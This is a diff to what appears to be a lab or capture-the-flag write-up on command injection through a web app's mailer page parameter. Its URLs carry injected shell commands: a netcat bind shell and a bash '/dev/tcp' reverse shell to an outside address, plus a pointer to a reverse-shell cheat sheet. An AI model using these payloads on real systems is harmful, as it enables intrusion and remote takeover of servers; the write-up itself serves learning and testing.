@@ -200,4 +200,14 @@ It's time for `ncat`! ...Or not?
 http://192.168.xx.xx:60080/?page=mailer&mail=nc%20-nvlp%204443%20-e%20/bin/bash
 > How you gonna use netcat so obviously. Cmon man. This is all in the logs.
 
-Alright, so I can't use `nc` or `ncat` or `netcat` in any carnation. 
+Alright, so I can't use `nc` or `ncat` or `netcat` in any incarnation. Thankfully, PentestMonkey has a writeup on how to do it with bash:
+
+http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+
+So, I've rewritten the above URL to be the following:
+
+http://192.168.xx.xx:60080/?page=mailer&mail=bash%20-i%20%3E&%20/dev/tcp/10.0.0.1/4443%200%3E&1
+
+This gives no output, but let's test using a terminal:
+
+
